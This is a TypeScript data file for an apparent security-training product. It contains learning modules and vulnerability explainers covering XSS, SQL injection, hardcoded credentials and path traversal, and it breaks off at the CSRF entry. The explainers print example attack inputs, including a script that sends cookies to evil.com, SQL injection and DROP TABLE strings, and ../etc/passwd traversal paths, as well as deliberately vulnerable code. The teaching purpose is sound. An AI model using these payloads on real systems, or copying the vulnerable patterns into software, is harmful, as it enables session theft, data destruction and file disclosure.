export interface LearningModule {
  id: string;
  title: string;
  description: string;
  category: string;
  level: "Beginner" | "Intermediate" | "Advanced";
  duration: string;
  durationMinutes: number;
  icon: string;
  sections: ModuleSection[];
}

export interface ModuleSection {
  title: string;
  content: string;
}

export interface VulnerabilityExplainer {
  id: string;
  cwe: string;
  title: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  type: "Article" | "Interactive" | "Video";
  readTime: string;
  readTimeMinutes: number;
  summary: string;
  whatIsIt: string;
  howItWorks: string;
  realWorldExample: string;
  howToDetect: string;
  howToFix: string;
  codeExampleBad: string;
  codeExampleGood: string;
  references: string[];
}

export const LEARNING_MODULES: LearningModule[] = [
  {
    id: "owasp-top-10",
    title: "Understanding the OWASP Top 10",
    description: "Learn about the ten most critical web application security risks identified by OWASP, with real-world examples and mitigation strategies.",
    category: "Web Security",
    level: "Beginner",
    duration: "45 min",
    durationMinutes: 45,
    icon: "shield",
    sections: [
      {
        title: "What is OWASP?",
        content: "The Open Web Application Security Project (OWASP) is a nonprofit foundation that works to improve the security of software. The OWASP Top 10 is a standard awareness document representing a broad consensus about the most critical security risks to web applications. It is updated every few years based on data from hundreds of organizations and thousands of real-world vulnerabilities.\n\nThe Top 10 is not an exhaustive list of all possible vulnerabilities — it's a prioritized guide to the risks that matter most. Security teams, developers, and auditors use it as a baseline for secure development practices.",
      },
      {
        title: "A01: Broken Access Control",
        content: "Access control enforces policy so that users cannot act outside their intended permissions. When access control is broken, attackers can access unauthorized functionality or data — such as viewing other users' accounts, modifying data, or changing access rights.\n\n**Common examples:**\n- Modifying the URL or API parameter to access another user's data (e.g., changing `/api/users/123` to `/api/users/456`)\n- Elevating privileges from a regular user to an admin\n- Accessing API endpoints without proper authentication\n- CORS misconfiguration allowing unauthorized API access\n\n**How to prevent it:**\n- Deny access by default (except for public resources)\n- Implement access control mechanisms once and reuse them throughout the application\n- Enforce record ownership — users should only access their own data\n- Log access control failures and alert administrators",
      },
      {
        title: "A02: Cryptographic Failures",
        content: "Previously known as 'Sensitive Data Exposure,' this category focuses on failures related to cryptography that often lead to sensitive data exposure. This includes transmitting data in clear text, using weak or old cryptographic algorithms, and improper key management.\n\n**Common examples:**\n- Storing passwords in plain text or with weak hashing (MD5, SHA-1)\n- Transmitting sensitive data over HTTP instead of HTTPS\n- Using deprecated cryptographic algorithms (DES, RC4)\n- Hardcoding encryption keys in source code\n\n**How to prevent it:**\n- Classify data and identify which is sensitive according to privacy laws and business needs\n- Encrypt all sensitive data at rest and in transit\n- Use strong, up-to-date algorithms (AES-256, bcrypt/argon2 for passwords)\n- Never store cryptographic keys in source code",
      },
      {
        title: "A03: Injection",
        content: "Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The attacker's hostile data can trick the interpreter into executing unintended commands or accessing data without authorization.\n\n**Common types:**\n- SQL Injection — manipulating database queries\n- Cross-Site Scripting (XSS) — injecting scripts into web pages\n- Command Injection — executing OS commands\n- LDAP Injection — manipulating directory queries\n\n**How to prevent it:**\n- Use parameterized queries / prepared statements for SQL\n- Validate and sanitize all user input\n- Use an ORM (like Drizzle, Prisma, or Sequelize) which parameterizes by default\n- Apply context-specific output encoding for XSS prevention",
      },
      {
        title: "A04–A10: Overview",
        content: "**A04: Insecure Design** — Flaws in the architecture itself, not just the implementation. Use threat modeling and secure design patterns.\n\n**A05: Security Misconfiguration** — Missing security hardening, default credentials, unnecessary features enabled. Automate configuration and use security headers.\n\n**A06: Vulnerable and Outdated Components** — Using libraries with known vulnerabilities. Keep dependencies updated and use SCA tools (like Aithon Shield's SCA scanner).\n\n**A07: Identification and Authentication Failures** — Weak passwords, missing MFA, session fixation. Implement multi-factor authentication and secure session management.\n\n**A08: Software and Data Integrity Failures** — Insecure CI/CD pipelines, unsigned updates, deserialization flaws. Verify software integrity and use digital signatures.\n\n**A09: Security Logging and Monitoring Failures** — Insufficient logging makes breaches undetectable. Log security events and set up alerting.\n\n**A10: Server-Side Request Forgery (SSRF)** — The application fetches a remote resource without validating the user-supplied URL. Validate and sanitize all URLs.",
      },
    ],
  },
  {
    id: "secure-coding-js",
    title: "Secure Coding in JavaScript & TypeScript",
    description: "Practical patterns for writing secure JavaScript and TypeScript code, covering input validation, authentication, dependency management, and common pitfalls.",
    category: "Secure Development",
    level: "Intermediate",
    duration: "60 min",
    durationMinutes: 60,
    icon: "code",
    sections: [
      {
        title: "Input Validation & Sanitization",
        content: "Every piece of data that comes from outside your application — user forms, URL parameters, API requests, file uploads, cookies — must be treated as untrusted.\n\n**Key principles:**\n- **Validate on the server**, not just the client. Client-side validation is for UX; server-side validation is for security.\n- **Use schema validation** libraries like Zod, Joi, or Yup to define exactly what shape data should have.\n- **Whitelist, don't blacklist.** Define what IS allowed rather than trying to block what isn't.\n- **Sanitize HTML** with libraries like DOMPurify before rendering user-generated content.\n\n**Example with Zod:**\n```typescript\nconst userInput = z.object({\n  email: z.string().email(),\n  age: z.number().int().min(0).max(150),\n  name: z.string().min(1).max(100).regex(/^[a-zA-Z\\s]+$/),\n});\n```\n\nNever use `eval()`, `new Function()`, or `innerHTML` with user input.",
      },
      {
        title: "Authentication & Session Management",
        content: "Authentication is the process of verifying who a user is. Getting it wrong means attackers can impersonate legitimate users.\n\n**Best practices:**\n- **Hash passwords** with bcrypt or argon2 (never MD5 or SHA-1)\n- **Use secure session cookies** with `httpOnly`, `secure`, and `sameSite` flags\n- **Implement rate limiting** on login endpoints to prevent brute force\n- **Add multi-factor authentication (MFA)** for sensitive operations\n- **Set session timeouts** — don't let sessions live forever\n- **Regenerate session IDs** after login to prevent session fixation\n\n**Common mistakes:**\n- Storing passwords in plain text\n- Using JWT tokens without expiration\n- Not invalidating sessions on logout\n- Sending credentials over HTTP",
      },
      {
        title: "Dependency Security",
        content: "Modern JavaScript applications rely on hundreds of npm packages. Each one is a potential attack vector.\n\n**Key practices:**\n- **Run `npm audit`** regularly (or use Aithon Shield's SCA scanner)\n- **Pin dependency versions** in `package-lock.json` — always commit it\n- **Review new dependencies** before adding them — check download counts, maintenance status, and known vulnerabilities\n- **Use tools like Socket.dev** to detect supply-chain attacks\n- **Keep dependencies updated** — outdated packages accumulate vulnerabilities\n- **Minimize your dependency tree** — fewer dependencies = smaller attack surface\n\n**Supply chain attacks are real:**\n- The `event-stream` incident (2018) — a malicious maintainer added cryptocurrency-stealing code\n- The `ua-parser-js` hijack (2021) — a popular package was compromised to install cryptominers\n- The `colors` and `faker` sabotage (2022) — a maintainer intentionally broke their own packages",
      },
      {
        title: "Secrets Management",
        content: "Hardcoded secrets in source code are one of the most common and dangerous vulnerabilities.\n\n**Never do this:**\n```typescript\nconst API_KEY = \"sk-abc123def456\";\nconst DB_URL = \"postgres://admin:password@prod-db:5432/app\";\n```\n\n**Instead:**\n- Use **environment variables** (`process.env.API_KEY`)\n- Use a **secrets manager** (AWS Secrets Manager, HashiCorp Vault, Doppler)\n- Use **`.env` files** locally (and add `.env` to `.gitignore`)\n- **Rotate secrets regularly** — use Aithon Shield's Secrets Rotation workflow\n- **Scan for secrets** in your CI/CD pipeline before code reaches production\n\n**If a secret is committed to git:**\n1. Immediately revoke/rotate the compromised secret\n2. Remove it from the code\n3. Use `git filter-branch` or BFG Repo-Cleaner to purge it from history\n4. Force-push the cleaned history\n5. Notify affected parties",
      },
      {
        title: "Error Handling & Logging",
        content: "Poor error handling can leak sensitive information. Poor logging means you won't know when you've been breached.\n\n**Error handling rules:**\n- Never expose stack traces, database errors, or internal paths to users\n- Return generic error messages to clients; log detailed errors server-side\n- Use structured error types, not string messages\n\n**Logging best practices:**\n- Log authentication events (login, logout, failed attempts)\n- Log authorization failures (access denied)\n- Log input validation failures\n- **Never log sensitive data** (passwords, tokens, credit card numbers)\n- Use structured logging (JSON format) for easy parsing\n- Set up alerts for suspicious patterns (many failed logins, unusual access patterns)",
      },
    ],
  },
  {
    id: "secrets-management",
    title: "Secrets Management Best Practices",
    description: "A complete guide to managing API keys, database credentials, tokens, and other secrets securely across development, CI/CD, and production environments.",
    category: "DevSecOps",
    level: "Intermediate",
    duration: "30 min",
    durationMinutes: 30,
    icon: "key",
    sections: [
      {
        title: "Why Secrets Management Matters",
        content: "A 'secret' is any piece of sensitive data that grants access to a system — API keys, database passwords, OAuth tokens, SSH keys, encryption keys, and certificates.\n\n**The problem:** Developers routinely hardcode secrets into source code, configuration files, and CI/CD pipelines. When these secrets end up in version control, they become accessible to anyone with repository access — and if the repo is public, to the entire internet.\n\n**Real impact:**\n- In 2023, GitHub reported finding over 10 million secrets exposed in public repositories\n- The average cost of a data breach involving compromised credentials is $4.5 million (IBM, 2023)\n- Uber's 2022 breach started with a compromised credential found in a Slack message\n\nAithon Shield's secrets detection scanner (CWE-798) catches hardcoded credentials before they reach production.",
      },
      {
        title: "The Secrets Lifecycle",
        content: "Every secret goes through a lifecycle that must be managed:\n\n**1. Generation** — Create strong, random secrets. Never use dictionary words or predictable patterns.\n\n**2. Storage** — Store secrets in a dedicated secrets manager, never in code or config files checked into version control.\n\n**3. Distribution** — Deliver secrets to applications securely. Use environment variables, mounted volumes, or secrets manager SDKs.\n\n**4. Rotation** — Change secrets regularly. Automate rotation where possible. Aithon Shield's Secrets Rotation workflow guides you through each step.\n\n**5. Revocation** — When a secret is compromised or no longer needed, revoke it immediately.\n\n**6. Auditing** — Log who accessed which secrets and when. Monitor for unusual access patterns.",
      },
      {
        title: "Tools & Solutions",
        content: "**Secrets Managers:**\n- **HashiCorp Vault** — Industry standard, supports dynamic secrets, leasing, and revocation\n- **AWS Secrets Manager** — Native AWS integration, automatic rotation for RDS/Redshift\n- **Google Cloud Secret Manager** — GCP-native, IAM-based access control\n- **Azure Key Vault** — Azure-native, supports HSM-backed keys\n- **Doppler** — Developer-friendly, great for startups\n\n**For local development:**\n- `.env` files with `dotenv` library (add `.env` to `.gitignore`)\n- `direnv` for directory-specific environment variables\n- 1Password CLI for team secret sharing\n\n**For CI/CD:**\n- GitHub Actions Secrets\n- GitLab CI/CD Variables (masked)\n- AWS Systems Manager Parameter Store\n\n**Detection tools:**\n- Aithon Shield (SAST + secrets scanning)\n- GitLeaks / TruffleHog for git history scanning\n- pre-commit hooks to catch secrets before they're committed",
      },
    ],
  },
  {
    id: "container-security",
    title: "Container Security Fundamentals",
    description: "Learn how to build, scan, and deploy secure Docker containers, including image hardening, vulnerability scanning, and runtime security.",
    category: "Cloud & Infrastructure",
    level: "Intermediate",
    duration: "40 min",
    durationMinutes: 40,
    icon: "container",
    sections: [
      {
        title: "Container Threat Model",
        content: "Containers introduce a unique attack surface that differs from traditional VMs:\n\n**Image-level risks:**\n- Base images with known vulnerabilities (outdated OS packages)\n- Malicious images from untrusted registries\n- Secrets baked into image layers\n- Unnecessary packages increasing attack surface\n\n**Runtime risks:**\n- Container escape (breaking out of the container to the host)\n- Privilege escalation (running as root inside the container)\n- Network-level attacks between containers\n- Resource exhaustion (CPU/memory denial of service)\n\n**Supply chain risks:**\n- Compromised base images\n- Dependency confusion in multi-stage builds\n- Unsigned images deployed to production",
      },
      {
        title: "Building Secure Images",
        content: "**Use minimal base images:**\n- Prefer `alpine`, `distroless`, or `scratch` over full OS images\n- `node:20-alpine` is ~50MB vs `node:20` at ~350MB — smaller = fewer vulnerabilities\n\n**Multi-stage builds:**\n```dockerfile\n# Build stage\nFROM node:20-alpine AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --only=production\nCOPY . .\nRUN npm run build\n\n# Production stage\nFROM node:20-alpine\nWORKDIR /app\nCOPY --from=builder /app/dist ./dist\nCOPY --from=builder /app/node_modules ./node_modules\nUSER node\nCMD [\"node\", \"dist/index.js\"]\n```\n\n**Key practices:**\n- Run as a non-root user (`USER node`)\n- Don't copy `.env` files or secrets into the image\n- Pin base image versions (use SHA digests for production)\n- Use `.dockerignore` to exclude unnecessary files\n- Scan images with Aithon Shield's container scanner before deploying",
      },
      {
        title: "Runtime Security",
        content: "**Least privilege:**\n- Drop all Linux capabilities and add only what's needed\n- Use read-only root filesystems where possible\n- Set memory and CPU limits to prevent resource exhaustion\n\n**Network security:**\n- Use network policies to restrict container-to-container communication\n- Don't expose unnecessary ports\n- Use service meshes (Istio, Linkerd) for mTLS between services\n\n**Monitoring:**\n- Log all container events (start, stop, exec, network connections)\n- Use runtime security tools (Falco, Sysdig) to detect anomalous behavior\n- Set up alerts for unexpected processes, file modifications, or network connections\n- Regularly scan running containers for newly discovered vulnerabilities",
      },
    ],
  },
  {
    id: "sca-dependency-security",
    title: "SCA & Dependency Security",
    description: "Understand Software Composition Analysis (SCA), how to manage open-source risk, and how to respond when a vulnerability is found in your dependencies.",
    category: "Supply Chain",
    level: "Beginner",
    duration: "35 min",
    durationMinutes: 35,
    icon: "package",
    sections: [
      {
        title: "What is SCA?",
        content: "Software Composition Analysis (SCA) is the process of identifying open-source and third-party components in your codebase and checking them for known vulnerabilities, license compliance issues, and quality risks.\n\n**Why it matters:**\n- Modern applications are 70-90% open-source code\n- The average application has 200+ direct and transitive dependencies\n- New vulnerabilities are discovered daily — a safe dependency today may be vulnerable tomorrow\n\n**How Aithon Shield's SCA works:**\n1. Parses your dependency files (`package.json`, `requirements.txt`, `pom.xml`, etc.)\n2. Builds a complete dependency tree (including transitive dependencies)\n3. Cross-references every component against vulnerability databases (NVD, GitHub Advisories, OSV)\n4. Reports findings with severity, CVSS score, affected versions, and fix recommendations\n5. Checks reachability — is the vulnerable function actually called in your code?",
      },
      {
        title: "Understanding CVSS Scores",
        content: "The Common Vulnerability Scoring System (CVSS) rates vulnerabilities on a 0-10 scale:\n\n| Score | Rating | What it means |\n|-------|--------|---------------|\n| 9.0-10.0 | Critical | Exploit is trivial, impact is severe. Patch immediately. |\n| 7.0-8.9 | High | Significant risk. Patch within days. |\n| 4.0-6.9 | Medium | Moderate risk. Patch within weeks. |\n| 0.1-3.9 | Low | Minor risk. Patch in next release cycle. |\n\n**Important:** CVSS alone doesn't tell the full story. Consider:\n- **Reachability** — Is the vulnerable code path actually used in your application?\n- **Exploitability** — Is there a public exploit available?\n- **Environment** — Is the component exposed to the internet or internal only?\n\nAithon Shield combines CVSS with reachability analysis to give you a more accurate priority score.",
      },
      {
        title: "Responding to Dependency Vulnerabilities",
        content: "When Aithon Shield flags a vulnerable dependency, follow this workflow:\n\n**1. Assess** — Check the severity, reachability, and whether a fix exists.\n\n**2. Decide:**\n- **Upgrade** — If a patched version exists, upgrade to it. Use Aithon Shield's Dependency Upgrade Planner.\n- **Workaround** — If no patch exists, can you mitigate the risk? (e.g., input validation, WAF rules)\n- **Accept risk** — If the vulnerability is not reachable or the risk is low, document the decision using Risk Acceptance.\n- **Replace** — If the library is unmaintained, find an alternative.\n\n**3. Verify** — Re-scan after applying the fix to confirm the vulnerability is resolved.\n\n**4. Monitor** — Add the CVE to your watchlist so you're alerted if the situation changes.\n\n**Pro tip:** Use `npm audit fix` for automatic safe upgrades, but always test afterward. Major version upgrades may have breaking changes.",
      },
    ],
  },
  {
    id: "iac-security",
    title: "Infrastructure as Code Security",
    description: "Learn how to secure Terraform, CloudFormation, Kubernetes manifests, and other IaC templates before deploying to production.",
    category: "Cloud & Infrastructure",
    level: "Advanced",
    duration: "50 min",
    durationMinutes: 50,
    icon: "cloud",
    sections: [
      {
        title: "Why IaC Security Matters",
        content: "Infrastructure as Code (IaC) defines your cloud infrastructure in configuration files — Terraform, CloudFormation, Kubernetes YAML, Ansible playbooks, and more. Misconfigurations in these files can create severe security vulnerabilities:\n\n- **S3 buckets left public** — Data breaches affecting millions of records\n- **Security groups with 0.0.0.0/0** — Databases exposed to the internet\n- **IAM policies with `*` permissions** — Overly permissive access\n- **Unencrypted storage** — Data at rest without encryption\n- **Missing logging** — No audit trail for security events\n\nThe advantage of IaC is that security can be checked **before deployment** — shift-left security at the infrastructure level.",
      },
      {
        title: "Common Misconfigurations",
        content: "**AWS / Terraform:**\n- S3 bucket without `block_public_access`\n- RDS instance without `storage_encrypted = true`\n- Security group allowing ingress from `0.0.0.0/0` on port 22 (SSH)\n- IAM policy with `\"Action\": \"*\"` and `\"Resource\": \"*\"`\n- CloudTrail logging disabled\n\n**Kubernetes:**\n- Pod running as root (`runAsUser: 0`)\n- Container with `privileged: true`\n- Missing resource limits (CPU/memory)\n- Using `latest` tag instead of pinned image versions\n- No network policies (all pods can talk to all pods)\n\n**Docker Compose:**\n- Mounting the Docker socket (`/var/run/docker.sock`)\n- Using `privileged: true`\n- Hardcoded secrets in environment variables\n- No health checks defined",
      },
      {
        title: "Scanning & Prevention",
        content: "**Aithon Shield's IaC Scanner** checks Terraform, CloudFormation, Kubernetes, and Docker files for misconfigurations before they reach production.\n\n**Best practices:**\n- **Scan in CI/CD** — Block deployments that fail security checks\n- **Use policy as code** — Define security rules in `.aithonshield.yml`\n- **Enforce least privilege** — Every IAM role/policy should have minimum required permissions\n- **Encrypt everything** — Storage, databases, network traffic\n- **Enable logging** — CloudTrail, VPC Flow Logs, Kubernetes audit logs\n- **Tag resources** — For cost tracking and security ownership\n- **Use modules** — Pre-approved, security-reviewed Terraform modules reduce misconfiguration risk\n\n**Complementary tools:**\n- Checkov, tfsec, KICS for additional IaC scanning\n- OPA/Rego for custom policy enforcement\n- Sentinel (Terraform Enterprise) for policy as code",
      },
    ],
  },
];

export const VULNERABILITY_EXPLAINERS: VulnerabilityExplainer[] = [
  {
    id: "cwe-79",
    cwe: "CWE-79",
    title: "Cross-Site Scripting (XSS)",
    severity: "HIGH",
    type: "Article",
    readTime: "8 min",
    readTimeMinutes: 8,
    summary: "XSS allows attackers to inject malicious scripts into web pages viewed by other users, potentially stealing session cookies, credentials, or performing actions on behalf of the victim.",
    whatIsIt: "Cross-Site Scripting (XSS) is a vulnerability where an attacker injects malicious JavaScript code into a web application that is then executed in another user's browser. The browser trusts the script because it appears to come from the legitimate website.\n\nThere are three main types:\n- **Reflected XSS** — The malicious script is part of the URL and reflected back in the response\n- **Stored XSS** — The script is permanently stored on the server (e.g., in a database) and served to every user who views the affected page\n- **DOM-based XSS** — The vulnerability exists in client-side JavaScript that processes user input unsafely",
    howItWorks: "1. Attacker crafts a URL or input containing JavaScript code, e.g.: `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`\n2. The application includes this input in its HTML response without proper encoding\n3. The victim's browser receives the page and executes the injected script\n4. The script can steal cookies, modify the page, redirect the user, or make API requests as the victim",
    realWorldExample: "**British Airways (2018):** Attackers injected a malicious script into the BA website's payment page via a compromised third-party JavaScript library. The script captured credit card details from 380,000 customers as they typed them in. BA was fined £20 million by the ICO.\n\n**Fortnite (2019):** An XSS vulnerability in an old, unsecured Epic Games page allowed attackers to steal user authentication tokens, potentially accessing millions of player accounts.",
    howToDetect: "- Use Aithon Shield's SAST scanner which checks for unescaped output in templates\n- Look for `innerHTML`, `document.write()`, `eval()`, or `dangerouslySetInnerHTML` in code\n- Test with payloads like `<script>alert(1)</script>` or `\"><img src=x onerror=alert(1)>`\n- Use browser developer tools to check if input appears unescaped in the DOM",
    howToFix: "- **Encode output** — Use context-appropriate encoding (HTML entity encoding for HTML, JavaScript encoding for JS, URL encoding for URLs)\n- **Use a framework** — React, Vue, and Angular auto-escape by default. Don't bypass with `dangerouslySetInnerHTML`\n- **Content Security Policy (CSP)** — Set a strict CSP header to prevent inline script execution\n- **Sanitize HTML** — If you must render user HTML, use DOMPurify\n- **HttpOnly cookies** — Prevent JavaScript from accessing session cookies",
    codeExampleBad: "// VULNERABLE: User input rendered directly\napp.get('/search', (req, res) => {\n  res.send(`<h1>Results for: ${req.query.q}</h1>`);\n});\n\n// VULNERABLE: React dangerouslySetInnerHTML\n<div dangerouslySetInnerHTML={{__html: userComment}} />",
    codeExampleGood: "// SAFE: Use a templating engine that auto-escapes\napp.get('/search', (req, res) => {\n  res.render('search', { query: req.query.q }); // EJS/Pug auto-escapes\n});\n\n// SAFE: React auto-escapes by default\n<div>{userComment}</div>\n\n// SAFE: Sanitize if HTML is needed\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userComment)}} />",
    references: [
      "https://owasp.org/www-community/attacks/xss/",
      "https://cwe.mitre.org/data/definitions/79.html",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
    ],
  },
  {
    id: "cwe-89",
    cwe: "CWE-89",
    title: "SQL Injection",
    severity: "CRITICAL",
    type: "Article",
    readTime: "10 min",
    readTimeMinutes: 10,
    summary: "SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code through user input, potentially reading, modifying, or deleting all data in the database.",
    whatIsIt: "SQL Injection occurs when user-supplied data is included in a SQL query without proper sanitization or parameterization. The attacker can modify the query's logic to bypass authentication, extract sensitive data, modify or delete records, or even execute operating system commands on the database server.\n\nIt has been the #1 web vulnerability for over a decade and remains extremely common despite being well-understood and easy to prevent.",
    howItWorks: "Consider a login form that builds a SQL query:\n```sql\nSELECT * FROM users WHERE username = 'admin' AND password = 'password123'\n```\n\nIf the attacker enters `' OR '1'='1` as the password, the query becomes:\n```sql\nSELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'\n```\n\nSince `'1'='1'` is always true, this returns all users — bypassing authentication entirely.\n\nMore dangerous payloads can:\n- `UNION SELECT` to extract data from other tables\n- `DROP TABLE` to destroy data\n- `; EXEC xp_cmdshell` to run OS commands (SQL Server)",
    realWorldExample: "**Heartland Payment Systems (2008):** SQL injection was used to install malware that captured 130 million credit card numbers. The breach cost Heartland over $140 million.\n\n**Sony Pictures (2011):** A simple SQL injection attack on sonypictures.com exposed 1 million user accounts including passwords stored in plain text.\n\n**TalkTalk (2015):** A teenager used SQL injection to steal personal data of 157,000 customers. TalkTalk was fined £400,000 and lost 101,000 customers.",
    howToDetect: "- Aithon Shield's SAST scanner detects string concatenation in SQL queries\n- Look for patterns like `\"SELECT ... \" + userInput` or template literals with user data in SQL\n- Test with payloads: `' OR 1=1--`, `'; DROP TABLE users;--`, `' UNION SELECT null,null--`\n- Use SQLMap for automated SQL injection testing",
    howToFix: "- **Use parameterized queries** (prepared statements) — this is the #1 defense\n- **Use an ORM** — Drizzle, Prisma, Sequelize, TypeORM all parameterize by default\n- **Validate input** — Reject unexpected characters for fields like IDs (should be numeric)\n- **Least privilege** — Database accounts should have minimum required permissions\n- **WAF rules** — Web Application Firewalls can catch common SQL injection patterns",
    codeExampleBad: "// VULNERABLE: String concatenation\nconst query = `SELECT * FROM users WHERE id = ${req.params.id}`;\ndb.query(query);\n\n// VULNERABLE: Template literal in SQL\nconst result = await db.query(\n  `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`\n);",
    codeExampleGood: "// SAFE: Parameterized query\nconst result = await db.query(\n  'SELECT * FROM users WHERE id = $1',\n  [req.params.id]\n);\n\n// SAFE: Using Drizzle ORM\nconst user = await db.select()\n  .from(users)\n  .where(eq(users.id, req.params.id));\n\n// SAFE: Using Prisma\nconst user = await prisma.user.findUnique({\n  where: { id: req.params.id }\n});",
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://cwe.mitre.org/data/definitions/89.html",
      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
    ],
  },
  {
    id: "cwe-798",
    cwe: "CWE-798",
    title: "Hardcoded Credentials",
    severity: "CRITICAL",
    type: "Article",
    readTime: "6 min",
    readTimeMinutes: 6,
    summary: "Hardcoded credentials in source code give attackers direct access to systems when the code is exposed through version control, decompilation, or insider access.",
    whatIsIt: "CWE-798 covers the practice of embedding passwords, API keys, tokens, database connection strings, and other credentials directly in source code or configuration files that are checked into version control.\n\nThis is dangerous because:\n- Source code is often shared across teams, contractors, and open-source communities\n- Git history preserves secrets even after they're 'deleted' from the current version\n- Compiled applications can be decompiled to extract embedded strings\n- CI/CD logs may expose secrets passed as command-line arguments",
    howItWorks: "1. Developer hardcodes an API key: `const API_KEY = \"sk_live_abc123\"`\n2. Code is committed to Git and pushed to GitHub/GitLab\n3. Automated bots scan public repositories for patterns matching API keys, AWS credentials, etc.\n4. Within minutes, the exposed key is used to access the service — racking up charges, stealing data, or pivoting to other systems\n\nEven in private repositories, secrets can be exposed through:\n- Employee turnover (former employees retain access)\n- Accidental repository visibility changes\n- Backup leaks\n- Supply chain compromises",
    realWorldExample: "**Uber (2016):** Engineers hardcoded AWS credentials in a private GitHub repository. Attackers accessed the repo and used the credentials to download data on 57 million riders and drivers. Uber paid $148 million in settlement.\n\n**Samsung (2019):** Developers accidentally left credentials for Samsung's SmartThings platform in a public GitLab repository, potentially allowing access to internal services.\n\n**GitHub's own research (2023):** Over 10 million secrets were detected in public repositories in a single year, including AWS keys, database passwords, and private signing keys.",
    howToDetect: "- Aithon Shield's secrets scanner specifically targets CWE-798\n- Look for patterns: `password = \"...\"`, `api_key = \"...\"`, `AWS_SECRET_ACCESS_KEY`\n- Use pre-commit hooks (git-secrets, detect-secrets) to catch secrets before commit\n- Scan git history with TruffleHog or GitLeaks\n- Use Aithon Shield's Secrets Rotation workflow to track and remediate",
    howToFix: "- **Use environment variables** — `process.env.API_KEY`\n- **Use a secrets manager** — Vault, AWS Secrets Manager, Doppler\n- **Use `.env` files** locally (add to `.gitignore`)\n- **Rotate immediately** if a secret was ever committed to git\n- **Purge git history** using BFG Repo-Cleaner or `git filter-repo`\n- **Set up pre-commit hooks** to prevent future occurrences",
    codeExampleBad: "// VULNERABLE: Hardcoded API key\nconst stripe = require('stripe')('sk_live_EXAMPLE_REDACTED');\n\n// VULNERABLE: Hardcoded database URL\nconst db = new Pool({\n  connectionString: 'postgres://admin:SuperSecret123@prod-db.example.com:5432/myapp'\n});\n\n// VULNERABLE: Hardcoded AWS credentials\nconst AWS_ACCESS_KEY = 'AKIAIOSFODNN7EXAMPLE';\nconst AWS_SECRET_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';",
    codeExampleGood: "// SAFE: Environment variables\nconst stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);\n\n// SAFE: Environment variable for database\nconst db = new Pool({\n  connectionString: process.env.DATABASE_URL\n});\n\n// SAFE: AWS SDK reads from environment or IAM role automatically\nconst s3 = new S3Client({ region: 'us-east-1' });\n// Set AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as env vars",
    references: [
      "https://cwe.mitre.org/data/definitions/798.html",
      "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password",
    ],
  },
  {
    id: "cwe-22",
    cwe: "CWE-22",
    title: "Path Traversal",
    severity: "HIGH",
    type: "Article",
    readTime: "7 min",
    readTimeMinutes: 7,
    summary: "Path traversal allows attackers to access files outside the intended directory by manipulating file paths with sequences like '../', potentially reading sensitive system files or application source code.",
    whatIsIt: "Path Traversal (also called Directory Traversal) occurs when an application uses user-supplied input to construct file paths without properly validating or sanitizing the input. Attackers use special characters like `../` (dot-dot-slash) to navigate up the directory tree and access files outside the intended directory.\n\nThis can expose:\n- `/etc/passwd` — system user information\n- `/etc/shadow` — password hashes\n- Application source code and configuration files\n- Environment files containing secrets\n- Database files",
    howItWorks: "Consider an application that serves files based on a URL parameter:\n```\nhttps://example.com/download?file=report.pdf\n```\n\nThe server code might do:\n```javascript\nconst filePath = '/var/www/uploads/' + req.query.file;\nres.sendFile(filePath);\n```\n\nAn attacker changes the URL to:\n```\nhttps://example.com/download?file=../../../etc/passwd\n```\n\nThe resulting path becomes `/var/www/uploads/../../../etc/passwd` which resolves to `/etc/passwd`.\n\nVariations include:\n- URL encoding: `%2e%2e%2f` for `../`\n- Double encoding: `%252e%252e%252f`\n- Null byte injection: `../../../etc/passwd%00.pdf` (in older systems)",
    realWorldExample: "**Fortinet VPN (2019, CVE-2018-13379):** A path traversal vulnerability in FortiOS SSL VPN allowed unauthenticated attackers to download system files, including session tokens for active VPN users. This was exploited at scale, with credentials for 500,000 VPN accounts leaked online.\n\n**Apache HTTP Server (2021, CVE-2021-41773):** A path traversal flaw in Apache 2.4.49 allowed attackers to read files outside the document root and, in some configurations, execute arbitrary code. It was actively exploited within days of disclosure.",
    howToDetect: "- Aithon Shield's SAST scanner detects unsanitized file path construction\n- Look for `req.params` or `req.query` values used directly in `fs.readFile`, `res.sendFile`, `path.join` without validation\n- Test with payloads: `../`, `..\\`, `....//`, `%2e%2e%2f`\n- Check if the application follows symlinks",
    howToFix: "- **Use `path.resolve()` and verify** the resolved path starts with the expected base directory\n- **Use a whitelist** of allowed filenames rather than accepting arbitrary paths\n- **Strip path traversal sequences** — but be careful of double encoding\n- **Use `path.basename()`** to extract just the filename, discarding directory components\n- **Chroot or sandbox** the file-serving process\n- **Never use user input directly in file system operations**",
    codeExampleBad: "// VULNERABLE: Direct path concatenation\napp.get('/download', (req, res) => {\n  const filePath = path.join('/uploads', req.query.file);\n  res.sendFile(filePath);\n});\n\n// VULNERABLE: No validation\nconst content = fs.readFileSync(`./data/${req.params.name}`);",
    codeExampleGood: "// SAFE: Resolve and validate the path\napp.get('/download', (req, res) => {\n  const baseDir = path.resolve('/uploads');\n  const filePath = path.resolve(baseDir, req.query.file);\n  \n  // Ensure the resolved path is within the base directory\n  if (!filePath.startsWith(baseDir + path.sep)) {\n    return res.status(403).send('Access denied');\n  }\n  res.sendFile(filePath);\n});\n\n// SAFE: Use basename to strip directory components\nconst safeName = path.basename(req.params.name);\nconst content = fs.readFileSync(`./data/${safeName}`);",
    references: [
      "https://owasp.org/www-community/attacks/Path_Traversal",
      "https://cwe.mitre.org/data/definitions/22.html",
    ],
  },
  {
    id: "cwe-352",
    cwe: "CWE-352",
    title: "Cross-Site Request Forgery (CSRF)",
    severity: "MEDIUM",
    type: "Article",
    readTime: "6 min",
